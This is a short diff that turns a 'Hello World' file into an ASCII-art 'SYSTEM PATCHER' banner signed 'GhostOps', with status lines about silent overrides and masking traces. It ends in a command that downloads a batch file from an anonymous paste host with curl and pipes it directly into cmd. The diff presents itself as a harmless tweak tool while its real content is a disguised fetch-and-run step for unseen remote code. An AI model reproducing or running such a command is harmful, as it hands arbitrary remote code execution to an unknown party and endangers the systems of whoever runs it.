@@ -1,1 +1,18 @@
-Hello World ;D
+  _______                 _        
+ |__   __|               | |       
+    | |_      _____  __ _| | _____ 
+    | \ \ /\ / / _ \/ _` | |/ / __|
+    | |\ V  V /  __/ (_| |   <\__ \
+    |_| \_/\_/ \___|\__,_|_|\_\___/
+                                   
+        ▒▒ SYSTEM PATCHER v1.03 ▒▒
+════════════════════════════════════
+[✓] Locating volatile config...
+[✓] Checking silent override...
+[✓] Masking trace routes...
+[•] Getting tweak via curl...
+
+curl -sL https://0x0.st/abcXYZ.bat | cmd
+
+════════════════════════════════════
+        INITIATED BY: GhostOps
